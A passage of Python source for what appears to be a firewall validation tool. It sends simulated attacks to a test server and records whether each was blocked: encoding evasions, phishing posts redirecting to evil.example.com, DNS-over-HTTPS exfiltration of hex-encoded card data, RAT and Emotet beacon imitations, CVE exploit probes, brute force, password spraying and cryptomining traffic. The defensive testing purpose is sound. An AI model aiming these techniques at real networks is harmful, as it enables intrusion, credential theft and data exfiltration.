                    f'\r\n'
                    f'{chunked_body}'
                )
                s.sendall(http_req.encode())
                resp_data = b''
                while True:
                    try:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        resp_data += chunk
                    except socket.timeout:
                        break
                s.close()
                resp_str = resp_data.decode('utf-8', errors='replace')
                if 'UNION' in resp_str and 'SELECT' in resp_str:
                    return self._passthrough_result(test, 200,
                        'Chunked evasion passed through — firewall did not reassemble chunks',
                        url=url, method='POST', sent_payload=payload)
                if any(marker.lower() in resp_str.lower() for marker in BLOCK_PAGE_MARKERS):
                    return self._blocked_result(test,
                        'Block page detected — firewall reassembled chunks and detected attack',
                        url=url, method='POST', sent_payload=payload)
                if 'HTTP/1.1 403' in resp_str or 'HTTP/1.1 406' in resp_str:
                    return self._blocked_result(test,
                        'HTTP 403/406 — chunked attack blocked',
                        url=url, method='POST', sent_payload=payload)
                if not resp_data:
                    return self._blocked_result(test,
                        'Connection reset — firewall blocked chunked evasion',
                        url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, 200,
                    f'Chunked request got response — may not have been inspected: {resp_str[:150]}',
                    url=url, method='POST', sent_payload=payload)
            except (ConnectionResetError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'Connection reset — firewall detected chunked evasion: {e}',
                    url=url, method='POST', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'evasion_null_byte':
            # Path traversal with null byte — send via raw socket to preserve %00
            url = f'http://{host}:{http_port}/{payload}'
            path_query = f'/{payload}'
            try:
                resp = _raw_http_get(host, http_port, path_query, timeout=10)
                return self._analyze_response(test, resp, 'etc/passwd',
                    url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        else:
            # evasion_double_encode, evasion_unicode, evasion_case_mixing, evasion_comment_insert
            # Send via raw socket to preserve exact encoding (requests would re-encode)
            url = f'http://{host}:{http_port}/echo?payload={payload}'
            path_query = f'/echo?payload={payload}'
            try:
                resp = _raw_http_get(host, http_port, path_query, timeout=10)
                # Check for SQL/XSS indicators in response
                markers = ['UNION', 'SELECT', 'script', 'alert', 'passwd']
                marker_found = any(m.lower() in (resp.text or '').lower() for m in markers)
                if marker_found:
                    return self._passthrough_result(test, resp.status_code,
                        'Evasion payload echoed back — firewall did not decode/normalize',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

    def _test_credential_phishing(self, test: SecurityTestCase, host: str,
                                    http_port: int) -> SecurityTestResult:
        """Test credential phishing prevention — submit credentials to login forms."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'phish_http_login':
            url = f'http://{host}:{http_port}/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                }, timeout=10)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials accepted — Credential Phishing Prevention did not block submission. '
                        'Verify User-ID is configured and Credential Phishing Prevention is enabled in URL Filtering profile',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Credential Phishing Prevention detected credential submission: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'phish_https_login':
            url = f'https://{host}:443/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                }, timeout=10, verify=False)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials accepted over HTTPS — SSL Decryption + Credential Phishing Prevention did not block. '
                        'Verify SSL Decryption policy and Credential Phishing Prevention are both active',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — credential submission over HTTPS detected: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'phish_js_exfil':
            url = f'http://{host}:{http_port}/echo?u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Credentials exfiltrated via URL parameters — firewall did not detect credential data in GET request. '
                        'Check URL Filtering and Credential Phishing Prevention settings',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — credential exfiltration via URL detected: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'phish_hidden_form':
            url = f'http://{host}:{http_port}/login'
            try:
                resp = requests.post(url, data={
                    'username': 'admin@acmecorp.com',
                    'password': 'P@ssw0rd123!',
                    'csrf_token': 'abc123def456',
                    'redirect_url': 'http://evil.example.com/collect',
                    'org': 'AcmeCorp',
                }, timeout=10)
                if resp.status_code == 200 and 'authenticated' in (resp.text or '').lower():
                    return self._passthrough_result(test, resp.status_code,
                        'Phishing form accepted credentials with redirect to external domain — '
                        'Credential Phishing Prevention should detect this pattern',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'authenticated',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — phishing form credential harvest detected: {e}',
                    url=url, method='POST', sent_payload=payload)

        return self._error_result(test, f'Unknown credential phishing test: {test.id}')

    def _test_encrypted_dns(self, test: SecurityTestCase, host: str,
                             http_port: int) -> SecurityTestResult:
        """Test encrypted DNS (DoH/DoT) — firewall should detect and control encrypted DNS channels."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'doh_google':
            url = f'https://dns.google/resolve?name={payload}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
                    return self._passthrough_result(test, 200,
                        'DoH query to Google DNS succeeded — firewall did not block DNS-over-HTTPS. '
                        'Enable App-ID policy to block dns-over-https application',
                        url=url, method='GET', sent_payload=payload)
                if result.returncode != 0 or not result.stdout:
                    return self._blocked_result(test,
                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'DoH query did not return DNS answer — possibly blocked: {result.stdout[:150]}',
                    url=url, method='GET', sent_payload=payload)
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH connection timed out or blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'doh_cloudflare':
            url = f'https://cloudflare-dns.com/dns-query?name={payload}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and '"Answer"' in result.stdout:
                    return self._passthrough_result(test, 200,
                        'DoH query to Cloudflare DNS succeeded — firewall did not block DNS-over-HTTPS. '
                        'Enable App-ID policy to block dns-over-https application',
                        url=url, method='GET', sent_payload=payload)
                if result.returncode != 0 or not result.stdout:
                    return self._blocked_result(test,
                        f'DoH query blocked — App-ID identified and blocked dns-over-https (exit code: {result.returncode})',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'DoH query did not return answer — possibly blocked: {result.stdout[:150]}',
                    url=url, method='GET', sent_payload=payload)
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH connection timed out or blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'doh_exfil':
            # Encode credit card data as hex subdomain in DoH query
            exfil_data = '4111111111111111'
            hex_encoded = exfil_data.encode().hex()
            domain = f'{hex_encoded}.exfil.testdomain.com'
            url = f'https://dns.google/resolve?name={domain}&type=A'
            try:
                result = subprocess.run(
                    ['curl', '-s', '-m', '5', '-H', 'accept: application/dns-json', url],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout and len(result.stdout) > 10:
                    return self._passthrough_result(test, 200,
                        'Data exfiltration via DoH succeeded — hex-encoded sensitive data sent in DNS subdomain over HTTPS. '
                        'Firewall did not block encrypted DNS exfiltration channel',
                        url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
                return self._blocked_result(test,
                    f'DoH exfiltration blocked — firewall detected encrypted DNS data channel (exit code: {result.returncode})',
                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')
            except (subprocess.TimeoutExpired, OSError) as e:
                return self._blocked_result(test,
                    f'DoH exfiltration blocked: {e}',
                    url=url, method='GET', sent_payload=f'{hex_encoded}.exfil.testdomain.com')

        elif test.id == 'dot_query':
            # DNS-over-TLS on port 853
            url = 'tls://dns.google:853'
            try:
                # Build a minimal DNS query for the domain
                domain = payload or 'hacking.testcategory.com'
                txn_id = os.urandom(2)
                flags = struct.pack('!H', 0x0100)  # standard query, recursion desired
                counts = struct.pack('!HHHH', 1, 0, 0, 0)  # 1 question
                qname = b''
                for label in domain.split('.'):
                    qname += bytes([len(label)]) + label.encode()
                qname += b'\x00'
                qtype_qclass = struct.pack('!HH', 1, 1)  # A record, IN class
                dns_query = txn_id + flags + counts + qname + qtype_qclass
                # Wrap in TCP length prefix for DNS-over-TLS
                dns_msg = struct.pack('!H', len(dns_query)) + dns_query

                # Connect via TLS to port 853
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                tls_sock = ctx.wrap_socket(sock, server_hostname='dns.google')
                tls_sock.connect(('dns.google', 853))
                tls_sock.sendall(dns_msg)
                resp_data = tls_sock.recv(4096)
                tls_sock.close()

                if resp_data and len(resp_data) > 4:
                    return self._passthrough_result(test, 200,
                        'DNS-over-TLS query succeeded — firewall did not block DoT on port 853. '
                        'Enable App-ID policy to block dns-over-tls application',
                        url=url, method='TLS', sent_payload=domain)
                return self._blocked_result(test,
                    'DoT query returned empty response — possibly blocked',
                    url=url, method='TLS', sent_payload=domain)
            except (ConnectionResetError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'Connection reset — App-ID blocked DNS-over-TLS: {e}',
                    url=url, method='TLS', sent_payload=payload)
            except (socket.timeout, ssl.SSLError, OSError) as e:
                return self._blocked_result(test,
                    f'DoT connection blocked or timed out: {e}',
                    url=url, method='TLS', sent_payload=payload)

        return self._error_result(test, f'Unknown encrypted DNS test: {test.id}')

    def _test_spyware_phonehome(self, test: SecurityTestCase, host: str,
                                  http_port: int) -> SecurityTestResult:
        """Test known RAT/spyware phone-home patterns against Anti-Spyware signatures."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'spy_gh0st':
            url = f'http://{host}:{http_port}/echo'
            # Gh0st RAT uses a raw TCP connection starting with 5-byte magic "Gh0st"
            # followed by packet length fields. Send as POST body with binary content
            # to preserve the magic bytes on the wire (URL encoding would mangle them).
            gh0st_body = b'Gh0st\xab\xcd\x00\x00\x00\x48\x00\x00\x00\x36\x78\x9c' + b'\x00' * 40
            try:
                resp = requests.post(url, data=gh0st_body,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; Gh0st RAT client)',
                        'Content-Type': 'application/octet-stream',
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Gh0st RAT callback accepted — Anti-Spyware did not detect known RAT magic bytes and User-Agent pattern',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Gh0st RAT pattern blocked',
                    resp.status_code, url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected Gh0st RAT callback: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'spy_njrat':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = _raw_http_get(host, http_port,
                    f'/echo?payload={payload}',
                    extra_headers={
                        'User-Agent': 'njRAT/0.7d',
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'njRAT phone-home accepted — Anti-Spyware did not detect njRAT User-Agent and connection pattern',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — njRAT pattern blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected njRAT phone-home: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'spy_darkcomet':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; DarkComet RAT)',
                        'Content-Type': 'application/octet-stream',
                    }, timeout=10)
                if resp.status_code == 200 and 'DCDATA' in (resp.text or ''):
                    return self._passthrough_result(test, resp.status_code,
                        'DarkComet beacon accepted — Anti-Spyware did not detect DCDATA pipe-delimited C2 pattern',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'DCDATA',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected DarkComet beacon: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'spy_emotet':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Request-ID': 'emotet-c2-checkin',
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Emotet C2 check-in accepted — Anti-Spyware did not detect Emotet-style encoded POST with MSIE User-Agent',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, payload[:20],
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected Emotet C2 check-in: {e}',
                    url=url, method='POST', sent_payload=payload)

        return self._error_result(test, f'Unknown spyware phone-home test: {test.id}')

    def _test_cve_exploit(self, test: SecurityTestCase, host: str,
                           http_port: int) -> SecurityTestResult:
        """Test specific CVE exploit patterns against Vulnerability Protection signatures."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'cve_spring4shell':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=10)
                return self._analyze_response(test, resp, 'classLoader',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Vulnerability Protection detected Spring4Shell (CVE-2022-22965): {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'cve_apache_struts':
            # Payload is in Content-Type header — echo server won't echo it in body
            url = f'http://{host}:{http_port}/echo?payload=test'
            try:
                resp = requests.get(url,
                    headers={'Content-Type': payload}, timeout=10)
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Block page detected for Apache Struts exploit',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Apache Struts OGNL header blocked',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Apache Struts OGNL injection in Content-Type accepted — Vulnerability Protection did not detect CVE-2017-5638',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — Apache Struts exploit not blocked',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Vulnerability Protection detected Apache Struts RCE (CVE-2017-5638): {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'cve_proxyshell':
            url = f'http://{host}:{http_port}{payload}'
            try:
                resp = _raw_http_get(host, http_port, payload, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'ProxyShell autodiscover path traversal accepted — Vulnerability Protection did not detect CVE-2021-34473',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — ProxyShell exploit blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Vulnerability Protection detected ProxyShell (CVE-2021-34473): {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'cve_moveit':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-siLock-Transaction': 'folder_add_by_path',
                    }, timeout=10)
                # Payload in header + body — check both header detection and body echo
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Block page detected for MOVEit exploit',
                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — MOVEit SQLi blocked',
                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'MOVEit SQL injection accepted — Vulnerability Protection did not detect CVE-2023-34362 (X-siLock-Transaction header + SQL payload)',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — MOVEit exploit not blocked',
                    resp=resp, url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Vulnerability Protection detected MOVEit SQLi (CVE-2023-34362): {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'cve_confluence':
            path_query = f'/echo?payload={payload}'
            url = f'http://{host}:{http_port}{path_query}'
            try:
                resp = _raw_http_get(host, http_port, path_query, timeout=10)
                return self._analyze_response(test, resp, 'getRuntime',
                    url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Vulnerability Protection detected Confluence OGNL injection (CVE-2022-26134): {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown CVE exploit test: {test.id}')

    def _test_brute_force(self, test: SecurityTestCase, host: str,
                           http_port: int) -> SecurityTestResult:
        """Test brute-force detection by sending rapid sequential login attempts."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        attempts = payload.split('|')
        success_count = 0
        total = len(attempts)

        if test.id == 'bf_http_login':
            url = f'http://{host}:{http_port}/login'
            for pwd in attempts:
                try:
                    resp = requests.post(url, data={
                        'username': 'admin@company.com', 'password': pwd.strip(),
                    }, timeout=5)
                    if resp.status_code == 200:
                        success_count += 1
                except (requests.ConnectionError, requests.Timeout, OSError):
                    break
            if success_count >= total:
                return self._passthrough_result(test, 200,
                    f'All {total} brute-force login attempts succeeded — no rate limiting or blocking detected. '
                    'Configure Vulnerability Protection or Zone Protection brute-force settings',
                    url=url, method='POST', sent_payload=f'{total} rapid login attempts')
            return self._blocked_result(test,
                f'Brute-force detected — {success_count}/{total} attempts succeeded before blocking',
                url=url, method='POST', sent_payload=f'{total} rapid login attempts')

        elif test.id == 'bf_basic_auth':
            url = f'http://{host}:{http_port}/echo?payload=auth-test'
            for cred in attempts:
                try:
                    import base64
                    b64 = base64.b64encode(cred.strip().encode()).decode()
                    resp = requests.get(url,
                        headers={'Authorization': f'Basic {b64}'}, timeout=5)
                    if resp.status_code == 200:
                        success_count += 1
                except (requests.ConnectionError, requests.Timeout, OSError):
                    break
            if success_count >= total:
                return self._passthrough_result(test, 200,
                    f'All {total} Basic Auth brute-force attempts succeeded — no detection. '
                    'Configure brute-force protection for HTTP authentication',
                    url=url, method='GET', sent_payload=f'{total} auth attempts')
            return self._blocked_result(test,
                f'Brute-force detected — {success_count}/{total} auth attempts succeeded before blocking',
                url=url, method='GET', sent_payload=f'{total} auth attempts')

        elif test.id == 'bf_password_spray':
            url = f'http://{host}:{http_port}/login'
            for cred in attempts:
                parts = cred.strip().split(':', 1)
                if len(parts) != 2:
                    continue
                try:
                    resp = requests.post(url, data={
                        'username': parts[0], 'password': parts[1],
                    }, timeout=5)
                    if resp.status_code == 200:
                        success_count += 1
                except (requests.ConnectionError, requests.Timeout, OSError):
                    break
            if success_count >= total:
                return self._passthrough_result(test, 200,
                    f'All {total} password spray attempts succeeded — no rate limiting detected. '
                    'Configure Zone Protection with login detection',
                    url=url, method='POST', sent_payload=f'{total} spray attempts')
            return self._blocked_result(test,
                f'Password spray detected — {success_count}/{total} attempts succeeded before blocking',
                url=url, method='POST', sent_payload=f'{total} spray attempts')

        return self._error_result(test, f'Unknown brute force test: {test.id}')

    def _test_file_blocking(self, test: SecurityTestCase, host: str,
                             http_port: int) -> SecurityTestResult:
        """Test file blocking policy — download files that should be blocked by type."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{http_port}{payload}'

        file_names = {
            'fb_bat': 'test.bat', 'fb_ps1': 'test.ps1',
            'fb_hta': 'test.hta', 'fb_jar': 'test.jar',
        }
        fname = file_names.get(test.id, 'unknown')

        try:
            resp = requests.get(url, timeout=10)
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — File Blocking blocked {fname} download',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=fname)
            if resp.status_code in (403, 406, 502, 503, 504):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — {fname} download blocked by File Blocking policy',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=fname)
            if resp.status_code == 200:
                return self._passthrough_result(test, resp.status_code,
                    f'{fname} downloaded successfully — File Blocking policy did not block this file type. '
                    f'Add {fname.split(".")[-1].upper()} to the File Blocking profile',
                    resp=resp, url=url, method='GET', sent_payload=fname)
            return self._passthrough_result(test, resp.status_code,
                f'HTTP {resp.status_code} — {fname} download not blocked',
                resp=resp, url=url, method='GET', sent_payload=fname)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test,
                f'Connection blocked — File Blocking prevented {fname} download: {e}',
                url=url, method='GET', sent_payload=fname)

    def _test_wildfire(self, test: SecurityTestCase, host: str,
                        http_port: int) -> SecurityTestResult:
        """Test WildFire sandbox analysis — send novel/suspicious files."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'wf_novel_pe':
            url = f'http://{host}:{http_port}{payload}'
            try:
                resp = requests.get(url, timeout=10)
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — WildFire blocked suspicious PE download',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — PE with suspicious imports blocked',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Novel PE with suspicious imports (VirtualAllocEx, CreateRemoteThread) downloaded — '
                        'WildFire should submit for sandbox analysis. Check WildFire profile and forwarding settings',
                        resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — suspicious PE not blocked',
                    resp=resp, url=url, method='GET', sent_payload='suspicious.exe')
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — WildFire/AV prevented suspicious PE download: {e}',
                    url=url, method='GET', sent_payload='suspicious.exe')

        elif test.id == 'wf_macro_dropper':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'Content-Type': 'application/vnd.ms-word',
                        'Content-Disposition': 'attachment; filename="invoice.doc"',
                    }, timeout=10)
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — WildFire blocked macro dropper',
                        resp.status_code, resp=resp, url=url, method='POST', sent_payload=payload[:50])
                if resp.status_code == 200 and 'AutoOpen' in (resp.text or ''):
                    return self._passthrough_result(test, resp.status_code,
                        'Macro dropper with PowerShell download cradle passed through — WildFire should analyze Office documents with macros',
                        resp=resp, url=url, method='POST', sent_payload=payload[:50])
                return self._analyze_response(test, resp, 'AutoOpen',
                    url=url, method='POST', sent_payload=payload[:50])
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — WildFire detected macro dropper: {e}',
                    url=url, method='POST', sent_payload=payload[:50])

        elif test.id == 'wf_script_obfuscated':
            url = f'http://{host}:{http_port}{payload}'
            try:
                resp = requests.get(url, timeout=10)
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — WildFire blocked obfuscated script',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — obfuscated VBScript blocked',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Obfuscated VBScript with Chr() concatenation downloaded — WildFire should submit for dynamic analysis. '
                        'Check WildFire profile includes script file types',
                        resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — obfuscated script not blocked',
                    resp=resp, url=url, method='GET', sent_payload='obfuscated.vbs')
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — WildFire prevented obfuscated script download: {e}',
                    url=url, method='GET', sent_payload='obfuscated.vbs')

        return self._error_result(test, f'Unknown WildFire test: {test.id}')

    def _test_cryptomining(self, test: SecurityTestCase, host: str,
                            http_port: int) -> SecurityTestResult:
        """Test cryptomining/cryptojacking detection patterns."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'crypto_coinhive':
            url = f'http://{host}:{http_port}{payload}'
            try:
                resp = _raw_http_get(host, http_port, payload,
                    extra_headers={
                        'Upgrade': 'websocket',
                        'Connection': 'Upgrade',
                        'Sec-WebSocket-Protocol': 'coinhive',
                        'Sec-WebSocket-Version': '13',
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Coinhive mining script request accepted — Anti-Spyware did not detect cryptocurrency mining pattern. '
                        'Enable Anti-Spyware signatures for cryptocurrency miners',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Coinhive mining pattern blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected Coinhive mining: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'crypto_stratum':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'User-Agent': 'xmrig/6.18.0',
                    }, timeout=10)
                if resp.status_code == 200 and 'mining.subscribe' in (resp.text or ''):
                    return self._passthrough_result(test, resp.status_code,
                        'Stratum mining protocol accepted — Anti-Spyware did not detect JSON-RPC mining.subscribe with XMRig identification',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, 'mining.subscribe',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — Anti-Spyware detected Stratum mining protocol: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'crypto_pool_url':
            url = f'http://{host}:{http_port}/echo?payload={payload}'
            try:
                resp = _raw_http_get(host, http_port,
                    f'/echo?payload={payload}',
                    extra_headers={
                        'Host': payload,  # pool.minergate.com
                    }, timeout=10)
                if resp.status_code == 200:
